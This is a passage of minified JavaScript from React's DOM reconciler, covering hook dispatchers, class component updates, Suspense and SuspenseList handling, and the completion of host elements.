a=n.lastRenderedState,l=i(a,t);if(r.hasEagerState=!0,r.eagerState=l,Ze(l,a)){var o=n.interleaved;o===null?(r.next=r,Vl(n)):(r.next=o.next,o.next=r),n.interleaved=r;return}}catch{}finally{}t=Cp(e,n,r,s),t!==null&&(r=xe(),Qe(t,e,s,r),qp(t,n,s))}}function Gp(e){var n=e.alternate;return e===X||n!==null&&n===X}function Yp(e,n){gs=Zr=!0;var t=e.pending;t===null?n.next=n:(n.next=t.next,t.next=n),e.pending=n}function qp(e,n,t){if(t&4194240){var s=n.lanes;s&=e.pendingLanes,t|=s,n.lanes=t,Nl(e,t)}}var Jr={readContext:Ve,useCallback:he,useContext:he,useEffect:he,useImperativeHandle:he,useInsertionEffect:he,useLayoutEffect:he,useMemo:he,useReducer:he,useRef:he,useState:he,useDebugValue:he,useDeferredValue:he,useTransition:he,useMutableSource:he,useSyncExternalStore:he,useId:he,unstable_isNewReconciler:!1},um={readContext:Ve,useCallback:function(e,n){return nn().memoizedState=[e,n===void 0?null:n],e},useContext:Ve,useEffect:pc,useImperativeHandle:function(e,n,t){return t=t!=null?t.concat([e]):null,Tr(4194308,4,Fp.bind(null,n,e),t)},useLayoutEffect:function(e,n){return Tr(4194308,4,e,n)},useInsertionEffect:function(e,n){return Tr(4,2,e,n)},useMemo:function(e,n){var t=nn();return n=n===void 0?null:n,e=e(),t.memoizedState=[e,n],e},useReducer:function(e,n,t){var s=nn();return n=t!==void 0?t(n):n,s.memoizedState=s.baseState=n,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:n},s.queue=e,e=e.dispatch=om.bind(null,X,e),[s.memoizedState,e]},useRef:function(e){var n=nn();return e={current:e},n.memoizedState=e},useState:uc,useDebugValue:Ql,useDeferredValue:function(e){return nn().memoizedState=e},useTransition:function(){var e=uc(!1),n=e[0];return e=lm.bind(null,e[1]),nn().memoizedState=e,[n,e]},useMutableSource:function(){},useSyncExternalStore:function(e,n,t){var s=X,r=nn();if(Y){if(t===void 0)throw Error(T(407));t=t()}else{if(t=n(),ie===null)throw Error(T(349));ot&30||Rp(s,n,t)}r.memoizedState=t;var i={value:t,getSnapshot:n};return r.queue=i,pc(Mp.bind(null,s,i,e),[e]),s.flags|=2048,js(9,Op.bind(null,s,i,t,n),void 0,null),t},useId:function(){var e=nn(),n=ie.identifierPrefix;if(Y){var t=fn,s=hn;t=(s&~(1<<32-Ke(s)-1)).toString(32)+t,n=":"+n+"R"+t,t=Os++,0<t&&(n+="H"+t.toString(32)),n+=":"}else t=am++,n=":"+n+"r"+t.toString(32)+":";return e.memoizedState=n},unstable_isNewReconciler:!1},pm={readContext:Ve,useCallback:Vp,useContext:Ve,useEffect:Kl,useImperativeHandle:Up,useInsertionEffect:Dp,useLayoutEffect:Bp,useMemo:Hp,useReducer:na,useRef:zp,useState:function(){return na(Ms)},useDebugValue:Ql,useDeferredValue:function(e){var n=He();return Wp(n,te.memoizedState,e)},useTransition:function(){var e=na(Ms)[0],n=He().memoizedState;return[e,n]},useMutableSource:Pp,useSyncExternalStore:Lp,useId:$p,unstable_isNewReconciler:!1},dm={readContext:Ve,useCallback:Vp,useContext:Ve,useEffect:Kl,useImperativeHandle:Up,useInsertionEffect:Dp,useLayoutEffect:Bp,useMemo:Hp,useReducer:ta,useRef:zp,useState:function(){return ta(Ms)},useDebugValue:Ql,useDeferredValue:function(e){var n=He();return te===null?n.memoizedState=e:Wp(n,te.memoizedState,e)},useTransition:function(){var e=ta(Ms)[0],n=He().memoizedState;return[e,n]},useMutableSource:Pp,useSyncExternalStore:Lp,useId:$p,unstable_isNewReconciler:!1};function $e(e,n){if(e&&e.defaultProps){n=K({},n),e=e.defaultProps;for(var t in e)n[t]===void 0&&(n[t]=e[t]);return n}return n}function Ua(e,n,t,s){n=e.memoizedState,t=t(s,n),t=t==null?n:K({},n,t),e.memoizedState=t,e.lanes===0&&(e.updateQueue.baseState=t)}var ki={isMounted:function(e){return(e=e._reactInternals)?ht(e)===e:!1},enqueueSetState:function(e,n,t){e=e._reactInternals;var s=xe(),r=Fn(e),i=gn(s,r);i.payload=n,t!=null&&(i.callback=t),n=Dn(e,i,r),n!==null&&(Qe(n,e,r,s),Sr(n,e,r))},enqueueReplaceState:function(e,n,t){e=e._reactInternals;var s=xe(),r=Fn(e),i=gn(s,r);i.tag=1,i.payload=n,t!=null&&(i.callback=t),n=Dn(e,i,r),n!==null&&(Qe(n,e,r,s),Sr(n,e,r))},enqueueForceUpdate:function(e,n){e=e._reactInternals;var t=xe(),s=Fn(e),r=gn(t,s);r.tag=2,n!=null&&(r.callback=n),n=Dn(e,r,s),n!==null&&(Qe(n,e,s,t),Sr(n,e,s))}};function dc(e,n,t,s,r,i,a){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(s,i,a):n.prototype&&n.prototype.isPureReactComponent?!Cs(t,s)||!Cs(r,i):!0}function Xp(e,n,t){var s=!1,r=Wn,i=n.contextType;return typeof i=="object"&&i!==null?i=Ve(i):(r=Ae(n)?at:ge.current,s=n.contextTypes,i=(s=s!=null)?zt(e,r):Wn),n=new n(t,i),e.memoizedState=n.state!==null&&n.state!==void 0?n.state:null,n.updater=ki,e.stateNode=n,n._reactInternals=e,s&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=r,e.__reactInternalMemoizedMaskedChildContext=i),n}function hc(e,n,t,s){e=n.state,typeof n.componentWillReceiveProps=="function"&&n.componentWillReceiveProps(t,s),typeof n.UNSAFE_componentWillReceiveProps=="function"&&n.UNSAFE_componentWillReceiveProps(t,s),n.state!==e&&ki.enqueueReplaceState(n,n.state,null)}function Va(e,n,t,s){var r=e.stateNode;r.props=t,r.state=e.memoizedState,r.refs={},Hl(e);var i=n.contextType;typeof i=="object"&&i!==null?r.context=Ve(i):(i=Ae(n)?at:ge.current,r.context=zt(e,i)),r.state=e.memoizedState,i=n.getDerivedStateFromProps,typeof i=="function"&&(Ua(e,n,i,t),r.state=e.memoizedState),typeof n.getDerivedStateFromProps=="function"||typeof r.getSnapshotBeforeUpdate=="function"||typeof r.UNSAFE_componentWillMount!="function"&&typeof r.componentWillMount!="function"||(n=r.state,typeof r.componentWillMount=="function"&&r.componentWillMount(),typeof r.UNSAFE_componentWillMount=="function"&&r.UNSAFE_componentWillMount(),n!==r.state&&ki.enqueueReplaceState(r,r.state,null),Kr(e,t,r,s),r.state=e.memoizedState),typeof r.componentDidMount=="function"&&(e.flags|=4194308)}function Ut(e,n){try{var t="",s=n;do t+=Bh(s),s=s.return;while(s);var r=t}catch(i){r=`
Error generating stack: `+i.message+`
`+i.stack}return{value:e,source:n,stack:r,digest:null}}function sa(e,n,t){return{value:e,source:null,stack:t??null,digest:n??null}}function Ha(e,n){try{console.error(n.value)}catch(t){setTimeout(function(){throw t})}}var hm=typeof WeakMap=="function"?WeakMap:Map;function Kp(e,n,t){t=gn(-1,t),t.tag=3,t.payload={element:null};var s=n.value;return t.callback=function(){ni||(ni=!0,Ja=s),Ha(e,n)},t}function Qp(e,n,t){t=gn(-1,t),t.tag=3;var s=e.type.getDerivedStateFromError;if(typeof s=="function"){var r=n.value;t.payload=function(){return s(r)},t.callback=function(){Ha(e,n)}}var i=e.stateNode;return i!==null&&typeof i.componentDidCatch=="function"&&(t.callback=function(){Ha(e,n),typeof s!="function"&&(Bn===null?Bn=new Set([this]):Bn.add(this));var a=n.stack;this.componentDidCatch(n.value,{componentStack:a!==null?a:""})}),t}function fc(e,n,t){var s=e.pingCache;if(s===null){s=e.pingCache=new hm;var r=new Set;s.set(n,r)}else r=s.get(n),r===void 0&&(r=new Set,s.set(n,r));r.has(t)||(r.add(t),e=Cm.bind(null,e,n,t),n.then(e,e))}function mc(e){do{var n;if((n=e.tag===13)&&(n=e.memoizedState,n=n!==null?n.dehydrated!==null:!0),n)return e;e=e.return}while(e!==null);return null}function gc(e,n,t,s,r){return e.mode&1?(e.flags|=65536,e.lanes=r,e):(e===n?e.flags|=65536:(e.flags|=128,t.flags|=131072,t.flags&=-52805,t.tag===1&&(t.alternate===null?t.tag=17:(n=gn(-1,1),n.tag=2,Dn(t,n,1))),t.lanes|=1),e)}var fm=bn.ReactCurrentOwner,Te=!1;function we(e,n,t,s){n.child=e===null?Tp(n,null,t,s):Bt(n,e.child,t,s)}function vc(e,n,t,s,r){t=t.render;var i=n.ref;return Rt(n,r),s=ql(e,n,t,s,i,r),t=Xl(),e!==null&&!Te?(n.updateQueue=e.updateQueue,n.flags&=-2053,e.lanes&=~r,kn(e,n,r)):(Y&&t&&Il(n),n.flags|=1,we(e,n,s,r),n.child)}function yc(e,n,t,s,r){if(e===null){var i=t.type;return typeof i=="function"&&!io(i)&&i.defaultProps===void 0&&t.compare===null&&t.defaultProps===void 0?(n.tag=15,n.type=i,Zp(e,n,i,s,r)):(e=Pr(t.type,null,s,n,n.mode,r),e.ref=n.ref,e.return=n,n.child=e)}if(i=e.child,!(e.lanes&r)){var a=i.memoizedProps;if(t=t.compare,t=t!==null?t:Cs,t(a,s)&&e.ref===n.ref)return kn(e,n,r)}return n.flags|=1,e=Un(i,s),e.ref=n.ref,e.return=n,n.child=e}function Zp(e,n,t,s,r){if(e!==null){var i=e.memoizedProps;if(Cs(i,s)&&e.ref===n.ref)if(Te=!1,n.pendingProps=s=i,(e.lanes&r)!==0)e.flags&131072&&(Te=!0);else return n.lanes=e.lanes,kn(e,n,r)}return Wa(e,n,t,s,r)}function Jp(e,n,t){var s=n.pendingProps,r=s.children,i=e!==null?e.memoizedState:null;if(s.mode==="hidden")if(!(n.mode&1))n.memoizedState={baseLanes:0,cachePool:null,transitions:null},H(Ct,Le),Le|=t;else{if(!(t&1073741824))return e=i!==null?i.baseLanes|t:t,n.lanes=n.childLanes=1073741824,n.memoizedState={baseLanes:e,cachePool:null,transitions:null},n.updateQueue=null,H(Ct,Le),Le|=e,null;n.memoizedState={baseLanes:0,cachePool:null,transitions:null},s=i!==null?i.baseLanes:t,H(Ct,Le),Le|=s}else i!==null?(s=i.baseLanes|t,n.memoizedState=null):s=t,H(Ct,Le),Le|=s;return we(e,n,r,t),n.child}function ed(e,n){var t=n.ref;(e===null&&t!==null||e!==null&&e.ref!==t)&&(n.flags|=512,n.flags|=2097152)}function Wa(e,n,t,s,r){var i=Ae(t)?at:ge.current;return i=zt(n,i),Rt(n,r),t=ql(e,n,t,s,i,r),s=Xl(),e!==null&&!Te?(n.updateQueue=e.updateQueue,n.flags&=-2053,e.lanes&=~r,kn(e,n,r)):(Y&&s&&Il(n),n.flags|=1,we(e,n,t,r),n.child)}function wc(e,n,t,s,r){if(Ae(t)){var i=!0;$r(n)}else i=!1;if(Rt(n,r),n.stateNode===null)Cr(e,n),Xp(n,t,s),Va(n,t,s,r),s=!0;else if(e===null){var a=n.stateNode,l=n.memoizedProps;a.props=l;var o=a.context,c=t.contextType;typeof c=="object"&&c!==null?c=Ve(c):(c=Ae(t)?at:ge.current,c=zt(n,c));var u=t.getDerivedStateFromProps,m=typeof u=="function"||typeof a.getSnapshotBeforeUpdate=="function";m||typeof a.UNSAFE_componentWillReceiveProps!="function"&&typeof a.componentWillReceiveProps!="function"||(l!==s||o!==c)&&hc(n,a,s,c),Tn=!1;var h=n.memoizedState;a.state=h,Kr(n,s,a,r),o=n.memoizedState,l!==s||h!==o||Ne.current||Tn?(typeof u=="function"&&(Ua(n,t,u,s),o=n.memoizedState),(l=Tn||dc(n,t,l,s,h,o,c))?(m||typeof a.UNSAFE_componentWillMount!="function"&&typeof a.componentWillMount!="function"||(typeof a.componentWillMount=="function"&&a.componentWillMount(),typeof a.UNSAFE_componentWillMount=="function"&&a.UNSAFE_componentWillMount()),typeof a.componentDidMount=="function"&&(n.flags|=4194308)):(typeof a.componentDidMount=="function"&&(n.flags|=4194308),n.memoizedProps=s,n.memoizedState=o),a.props=s,a.state=o,a.context=c,s=l):(typeof a.componentDidMount=="function"&&(n.flags|=4194308),s=!1)}else{a=n.stateNode,Np(e,n),l=n.memoizedProps,c=n.type===n.elementType?l:$e(n.type,l),a.props=c,m=n.pendingProps,h=a.context,o=t.contextType,typeof o=="object"&&o!==null?o=Ve(o):(o=Ae(t)?at:ge.current,o=zt(n,o));var g=t.getDerivedStateFromProps;(u=typeof g=="function"||typeof a.getSnapshotBeforeUpdate=="function")||typeof a.UNSAFE_componentWillReceiveProps!="function"&&typeof a.componentWillReceiveProps!="function"||(l!==m||h!==o)&&hc(n,a,s,o),Tn=!1,h=n.memoizedState,a.state=h,Kr(n,s,a,r);var k=n.memoizedState;l!==m||h!==k||Ne.current||Tn?(typeof g=="function"&&(Ua(n,t,g,s),k=n.memoizedState),(c=Tn||dc(n,t,c,s,h,k,o)||!1)?(u||typeof a.UNSAFE_componentWillUpdate!="function"&&typeof a.componentWillUpdate!="function"||(typeof a.componentWillUpdate=="function"&&a.componentWillUpdate(s,k,o),typeof a.UNSAFE_componentWillUpdate=="function"&&a.UNSAFE_componentWillUpdate(s,k,o)),typeof a.componentDidUpdate=="function"&&(n.flags|=4),typeof a.getSnapshotBeforeUpdate=="function"&&(n.flags|=1024)):(typeof a.componentDidUpdate!="function"||l===e.memoizedProps&&h===e.memoizedState||(n.flags|=4),typeof a.getSnapshotBeforeUpdate!="function"||l===e.memoizedProps&&h===e.memoizedState||(n.flags|=1024),n.memoizedProps=s,n.memoizedState=k),a.props=s,a.state=k,a.context=o,s=c):(typeof a.componentDidUpdate!="function"||l===e.memoizedProps&&h===e.memoizedState||(n.flags|=4),typeof a.getSnapshotBeforeUpdate!="function"||l===e.memoizedProps&&h===e.memoizedState||(n.flags|=1024),s=!1)}return $a(e,n,t,s,i,r)}function $a(e,n,t,s,r,i){ed(e,n);var a=(n.flags&128)!==0;if(!s&&!a)return r&&rc(n,t,!1),kn(e,n,i);s=n.stateNode,fm.current=n;var l=a&&typeof t.getDerivedStateFromError!="function"?null:s.render();return n.flags|=1,e!==null&&a?(n.child=Bt(n,e.child,null,i),n.child=Bt(n,null,l,i)):we(e,n,l,i),n.memoizedState=s.state,r&&rc(n,t,!0),n.child}function nd(e){var n=e.stateNode;n.pendingContext?sc(e,n.pendingContext,n.pendingContext!==n.context):n.context&&sc(e,n.context,!1),Wl(e,n.containerInfo)}function kc(e,n,t,s,r){return Dt(),Dl(r),n.flags|=256,we(e,n,t,s),n.child}var Ga={dehydrated:null,treeContext:null,retryLane:0};function Ya(e){return{baseLanes:e,cachePool:null,transitions:null}}function td(e,n,t){var s=n.pendingProps,r=q.current,i=!1,a=(n.flags&128)!==0,l;if((l=a)||(l=e!==null&&e.memoizedState===null?!1:(r&2)!==0),l?(i=!0,n.flags&=-129):(e===null||e.memoizedState!==null)&&(r|=1),H(q,r&1),e===null)return Ba(n),e=n.memoizedState,e!==null&&(e=e.dehydrated,e!==null)?(n.mode&1?e.data==="$!"?n.lanes=8:n.lanes=1073741824:n.lanes=1,null):(a=s.children,e=s.fallback,i?(s=n.mode,i=n.child,a={mode:"hidden",children:a},!(s&1)&&i!==null?(i.childLanes=0,i.pendingProps=a):i=_i(a,s,0,null),e=st(e,s,t,null),i.return=n,e.return=n,i.sibling=e,n.child=i,n.child.memoizedState=Ya(t),n.memoizedState=Ga,e):Zl(n,a));if(r=e.memoizedState,r!==null&&(l=r.dehydrated,l!==null))return mm(e,n,a,s,l,r,t);if(i){i=s.fallback,a=n.mode,r=e.child,l=r.sibling;var o={mode:"hidden",children:s.children};return!(a&1)&&n.child!==r?(s=n.child,s.childLanes=0,s.pendingProps=o,n.deletions=null):(s=Un(r,o),s.subtreeFlags=r.subtreeFlags&14680064),l!==null?i=Un(l,i):(i=st(i,a,t,null),i.flags|=2),i.return=n,s.return=n,s.sibling=i,n.child=s,s=i,i=n.child,a=e.child.memoizedState,a=a===null?Ya(t):{baseLanes:a.baseLanes|t,cachePool:null,transitions:a.transitions},i.memoizedState=a,i.childLanes=e.childLanes&~t,n.memoizedState=Ga,s}return i=e.child,e=i.sibling,s=Un(i,{mode:"visible",children:s.children}),!(n.mode&1)&&(s.lanes=t),s.return=n,s.sibling=null,e!==null&&(t=n.deletions,t===null?(n.deletions=[e],n.flags|=16):t.push(e)),n.child=s,n.memoizedState=null,s}function Zl(e,n){return n=_i({mode:"visible",children:n},e.mode,0,null),n.return=e,e.child=n}function pr(e,n,t,s){return s!==null&&Dl(s),Bt(n,e.child,null,t),e=Zl(n,n.pendingProps.children),e.flags|=2,n.memoizedState=null,e}function mm(e,n,t,s,r,i,a){if(t)return n.flags&256?(n.flags&=-257,s=sa(Error(T(422))),pr(e,n,a,s)):n.memoizedState!==null?(n.child=e.child,n.flags|=128,null):(i=s.fallback,r=n.mode,s=_i({mode:"visible",children:s.children},r,0,null),i=st(i,r,a,null),i.flags|=2,s.return=n,i.return=n,s.sibling=i,n.child=s,n.mode&1&&Bt(n,e.child,null,a),n.child.memoizedState=Ya(a),n.memoizedState=Ga,i);if(!(n.mode&1))return pr(e,n,a,null);if(r.data==="$!"){if(s=r.nextSibling&&r.nextSibling.dataset,s)var l=s.dgst;return s=l,i=Error(T(419)),s=sa(i,s,void 0),pr(e,n,a,s)}if(l=(a&e.childLanes)!==0,Te||l){if(s=ie,s!==null){switch(a&-a){case 4:r=2;break;case 16:r=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:r=32;break;case 536870912:r=268435456;break;default:r=0}r=r&(s.suspendedLanes|a)?0:r,r!==0&&r!==i.retryLane&&(i.retryLane=r,wn(e,r),Qe(s,e,r,-1))}return ro(),s=sa(Error(T(421))),pr(e,n,a,s)}return r.data==="$?"?(n.flags|=128,n.child=e.child,n=Nm.bind(null,e),r._reactRetry=n,null):(e=i.treeContext,Re=zn(r.nextSibling),Oe=n,Y=!0,Ye=null,e!==null&&(De[Be++]=hn,De[Be++]=fn,De[Be++]=lt,hn=e.id,fn=e.overflow,lt=n),n=Zl(n,s.children),n.flags|=4096,n)}function xc(e,n,t){e.lanes|=n;var s=e.alternate;s!==null&&(s.lanes|=n),Fa(e.return,n,t)}function ra(e,n,t,s,r){var i=e.memoizedState;i===null?e.memoizedState={isBackwards:n,rendering:null,renderingStartTime:0,last:s,tail:t,tailMode:r}:(i.isBackwards=n,i.rendering=null,i.renderingStartTime=0,i.last=s,i.tail=t,i.tailMode=r)}function sd(e,n,t){var s=n.pendingProps,r=s.revealOrder,i=s.tail;if(we(e,n,s.children,t),s=q.current,s&2)s=s&1|2,n.flags|=128;else{if(e!==null&&e.flags&128)e:for(e=n.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&xc(e,t,n);else if(e.tag===19)xc(e,t,n);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===n)break e;for(;e.sibling===null;){if(e.return===null||e.return===n)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}s&=1}if(H(q,s),!(n.mode&1))n.memoizedState=null;else switch(r){case"forwards":for(t=n.child,r=null;t!==null;)e=t.alternate,e!==null&&Qr(e)===null&&(r=t),t=t.sibling;t=r,t===null?(r=n.child,n.child=null):(r=t.sibling,t.sibling=null),ra(n,!1,r,t,i);break;case"backwards":for(t=null,r=n.child,n.child=null;r!==null;){if(e=r.alternate,e!==null&&Qr(e)===null){n.child=r;break}e=r.sibling,r.sibling=t,t=r,r=e}ra(n,!0,t,null,i);break;case"together":ra(n,!1,null,null,void 0);break;default:n.memoizedState=null}return n.child}function Cr(e,n){!(n.mode&1)&&e!==null&&(e.alternate=null,n.alternate=null,n.flags|=2)}function kn(e,n,t){if(e!==null&&(n.dependencies=e.dependencies),ct|=n.lanes,!(t&n.childLanes))return null;if(e!==null&&n.child!==e.child)throw Error(T(153));if(n.child!==null){for(e=n.child,t=Un(e,e.pendingProps),n.child=t,t.return=n;e.sibling!==null;)e=e.sibling,t=t.sibling=Un(e,e.pendingProps),t.return=n;t.sibling=null}return n.child}function gm(e,n,t){switch(n.tag){case 3:nd(n),Dt();break;case 5:Ap(n);break;case 1:Ae(n.type)&&$r(n);break;case 4:Wl(n,n.stateNode.containerInfo);break;case 10:var s=n.type._context,r=n.memoizedProps.value;H(qr,s._currentValue),s._currentValue=r;break;case 13:if(s=n.memoizedState,s!==null)return s.dehydrated!==null?(H(q,q.current&1),n.flags|=128,null):t&n.child.childLanes?td(e,n,t):(H(q,q.current&1),e=kn(e,n,t),e!==null?e.sibling:null);H(q,q.current&1);break;case 19:if(s=(t&n.childLanes)!==0,e.flags&128){if(s)return sd(e,n,t);n.flags|=128}if(r=n.memoizedState,r!==null&&(r.rendering=null,r.tail=null,r.lastEffect=null),H(q,q.current),s)break;return null;case 22:case 23:return n.lanes=0,Jp(e,n,t)}return kn(e,n,t)}var rd,qa,id,ad;rd=function(e,n){for(var t=n.child;t!==null;){if(t.tag===5||t.tag===6)e.appendChild(t.stateNode);else if(t.tag!==4&&t.child!==null){t.child.return=t,t=t.child;continue}if(t===n)break;for(;t.sibling===null;){if(t.return===null||t.return===n)return;t=t.return}t.sibling.return=t.return,t=t.sibling}};qa=function(){};id=function(e,n,t,s){var r=e.memoizedProps;if(r!==s){e=n.stateNode,et(rn.current);var i=null;switch(t){case"input":r=ga(e,r),s=ga(e,s),i=[];break;case"select":r=K({},r,{value:void 0}),s=K({},s,{value:void 0}),i=[];break;case"textarea":r=wa(e,r),s=wa(e,s),i=[];break;default:typeof r.onClick!="function"&&typeof s.onClick=="function"&&(e.onclick=Hr)}xa(t,s);var a;t=null;for(c in r)if(!s.hasOwnProperty(c)&&r.hasOwnProperty(c)&&r[c]!=null)if(c==="style"){var l=r[c];for(a in l)l.hasOwnProperty(a)&&(t||(t={}),t[a]="")}else c!=="dangerouslySetInnerHTML"&&c!=="children"&&c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&c!=="autoFocus"&&(ks.hasOwnProperty(c)?i||(i=[]):(i=i||[]).push(c,null));for(c in s){var o=s[c];if(l=r!=null?r[c]:void 0,s.hasOwnProperty(c)&&o!==l&&(o!=null||l!=null))if(c==="style")if(l){for(a in l)!l.hasOwnProperty(a)||o&&o.hasOwnProperty(a)||(t||(t={}),t[a]="");for(a in o)o.hasOwnProperty(a)&&l[a]!==o[a]&&(t||(t={}),t[a]=o[a])}else t||(i||(i=[]),i.push(c,t)),t=o;else c==="dangerouslySetInnerHTML"?(o=o?o.__html:void 0,l=l?l.__html:void 0,o!=null&&l!==o&&(i=i||[]).push(c,o)):c==="children"?typeof o!="string"&&typeof o!="number"||(i=i||[]).push(c,""+o):c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&(ks.hasOwnProperty(c)?(o!=null&&c==="onScroll"&&$("scroll",e),i||l===o||(i=[])):(i=i||[]).push(c,o))}t&&(i=i||[]).push("style",t);var c=i;(n.updateQueue=c)&&(n.flags|=4)}};ad=function(e,n,t,s){t!==s&&(n.flags|=4)};function ns(e,n){if(!Y)switch(e.tailMode){case"hidden":n=e.tail;for(var t=null;n!==null;)n.alternate!==null&&(t=n),n=n.sibling;t===null?e.tail=null:t.sibling=null;break;case"collapsed":t=e.tail;for(var s=null;t!==null;)t.alternate!==null&&(s=t),t=t.sibling;s===null?n||e.tail===null?e.tail=null:e.tail.sibling=null:s.sibling=null}}function fe(e){var n=e.alternate!==null&&e.alternate.child===e.child,t=0,s=0;if(n)for(var r=e.child;r!==null;)t|=r.lanes|r.childLanes,s|=r.subtreeFlags&14680064,s|=r.flags&14680064,r.return=e,r=r.sibling;else for(r=e.child;r!==null;)t|=r.lanes|r.childLanes,s|=r.subtreeFlags,s|=r.flags,r.return=e,r=r.sibling;return e.subtreeFlags|=s,e.childLanes=t,n}function vm(e,n,t){var s=n.pendingProps;switch(zl(n),n.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return fe(n),null;case 1:return Ae(n.type)&&Wr(),fe(n),null;case 3:return s=n.stateNode,Ft(),G(Ne),G(ge),Gl(),s.pendingContext&&(s.context=s.pendingContext,s.pendingContext=null),(e===null||e.child===null)&&(cr(n)?n.flags|=4:e===null||e.memoizedState.isDehydrated&&!(n.flags&256)||(n.flags|=1024,Ye!==null&&(tl(Ye),Ye=null))),qa(e,n),fe(n),null;case 5:$l(n);var r=et(Rs.current);if(t=n.type,e!==null&&n.stateNode!=null)id(e,n,t,s,r),e.ref!==n.ref&&(n.flags|=512,n.flags|=2097152);else{if(!s){if(n.stateNode===null)throw Error(T(166));return fe(n),null}if(e=et(rn.current),cr(n)){s=n.stateNode,t=n.type;var i=n.memoizedProps;switch(s[tn]=n,s[Ps]=i,e=(n.mode&1)!==0,t){case"dialog":$("cancel",s),$("close",s);break;case"iframe":case"object":case"embed":$("load",s);break;case"video":case"audio":for(r=0;r<os.length;r++)$(os[r],s);break;case"source":$("error",s);break;case"img":case"image":case"link":$("error",s),$("load",s);break;case"details":$("toggle",s);break;case"input":Po(s,i),$("invalid",s);break;case"select":s._wrapperState={wasMultiple:!!i.multiple},$("invalid",s);break;case"textarea":Ro(s,i),$("invalid",s)}xa(t,i),r=null;for(var a in i)if(i.hasOwnProperty(a)){var l=i[a];a==="children"?typeof l=="string"?s.textContent!==l&&(i.suppressHydrationWarning!==!0&&or(s.textContent,l,e),r=["children",l]):typeof l=="number"&&s.textContent!==""+l&&(i.suppressHydrationWarning!==!0&&or(s.textContent,l,e),r=["children",""+l]):ks.hasOwnProperty(a)&&l!=null&&a==="onScroll"&&$("scroll",s)}switch(t){case"input":er(s),Lo(s,i,!0);break;case"textarea":er(s),Oo(s);break;case"select":case"option":break;default:typeof i.onClick=="function"&&(s.onclick=Hr)}s=r,n.updateQueue=s,s!==null&&(n.flags|=4)}else{a=r.nodeType===9?r:r.ownerDocument,e==="http://www.w3.org/1999/xhtml"&&(e=Mu(t)),e==="http://www.w3.org/1999/xhtml"?t==="script"?(e=a.createElement("div"),e.innerHTML="<script><\/script>",e=e.removeChild(e.firstChild)):typeof s.is=="string"?e=a.createElement(t,{is:s.is}):(e=a.createElement(t),t==="select"&&(a=e,s.multiple?a.multiple=!0:s.size&&(a.size=s.size))):e=a.createElementNS(e,t),e[tn]=n,e[Ps]=s,rd(e,n,!1,!1),n.stateNode=e;e:{switch(a=ba(t,s),t){case"dialog":$("cancel",e),$("close",e),r=s;break;case"iframe":case"object":case"embed":$("load",e),r=s;break;case"video":case"audio":for(r=0;r<os.length;r++)$(os[r],e);r=s;break;case"source":$("error",e),r=s;break;case"img":case"image":case"link":$("error",e),$("load",e),r=s;break;case"details":$("toggle",e),r=s;break;case"input":Po(e,s),r=ga(e,s),$("invalid",e);break;case"option":r=s;break;case"select":e._wrapperState={wasMultiple:!!s.multiple},r=K({},s,{value:void 0}),$("invalid",e);break;case"textarea":Ro(e,s),r=wa(e,s),$("invalid",e);break;default:r=s}xa(t,r),l=r;for(i in l)if(l.hasOwnProperty(i)){var o=l[i];i==="style"?zu(e,o):i==="dangerouslySetInnerHTML"?(o=o?o.__html:void 0,o!=null&&ju(e,o)):i==="children"?typeof o=="string"?(t!=="textarea"||o!=="")&&xs(e,o):typeof o=="number"&&xs(e,""+o):i!=="suppressContentEditableWarning"&&i!=="suppressHydrationWarning"&&i!=="autoFocus"&&(ks.hasOwnProperty(i)?o!=null&&i==="onScroll"&&$("scroll",e):o!=null&&bl(e,i,o,a))}switch(t){case"input":er(e),Lo(e,s,!1);break;case"textarea":er(e),Oo(e);break;case"option":s.value!=null&&e.setAttribute("value",""+Hn(s.value));break;case"select":e.multiple=!!s.multiple,i=s.value,i!=null?Nt(e,!!s.multiple,i,!1):s.defaultValue!=null&&Nt(e,!!s.multiple,s.defaultValue,!0);break;default:typeof r.onClick=="function"&&(e.onclick=Hr)}switch(t){case"button":case"input":case"select":case"textarea":s=!!s.autoFocus;break e;case"img":s=!0;break e;default:s=!1}}s&&(n.flags|=4)}n.ref!==null&&(n.flags|=512,n.flags|=2097152)}return fe(n),null;case 6:if(e&&n.stateNode!=null)ad(e,n,e.memoizedProps,s);else{if(typeof s!="string"&&n.stateNode===null)throw Error(T(166));if(t=et(Rs.current),et(rn.current),cr(n)){if(s=n.stateNode,t=n.memoizedProps,s[tn]=n,(i=s.nodeValue!==t)&&(e=Oe,e!==null))switch(e.tag){case 3:or(s.nodeValue,t,(e.mode&1)!==0);break;case 5:e.memoizedProps.suppressHydrationWarning!==!0&&or(s.nodeValue,t,(e.mode&1)!==0)}i&&(n.flags|=4)}else s=(t.nodeType===9?t:t.ownerDocument).createTextNode(s),s[tn]=n,n.stateNode=s}return fe(n),null;case 13:if(G(q),s=n.memoizedState,e===null||e.memoizedState!==null&&e.memoizedState.dehydrated!==null){if(Y&&Re!==null&&n.mode&1&&!(n.flags&128))Sp(),Dt(),n.flags|=98560,i=!1;else if(i=cr(n),s!==null&&s.dehydrated!==null){if(e===null){if(!i)throw Error(T(318));if(i=n.memoizedState,i=i!==null?i.dehydrated:null,!i)throw Error(T(317));i[tn]=n}else Dt(),!(n.flags&128)&&(n.memoizedState=null),n.flags|=4;fe(n),i=!1}else Ye!==null&&(tl(Ye),Ye=null),i=!0;if(!i)return n.flags&65536?n:null}return n.flags&128?(n.lanes=t,n):(s=s!==null,s!==(e!==null&&e.memoizedState!==null)&&s&&(n.child.flags|=8192,n.mode&1&&(e===null||q.current&1?se===0&&(se=3):ro())),n.updateQueue!==null&&(n.flags|=4),fe(n),null);case 4:return Ft(),qa(e,n),e===null&&Ns(n.stateNode.containerInfo),fe(n),null;case 10:return Ul(n.type._context),fe(n),null;case 17:return Ae(n.type)&&Wr(),fe(n),null;case 19:if(G(q),i=n.memoizedState,i===null)return 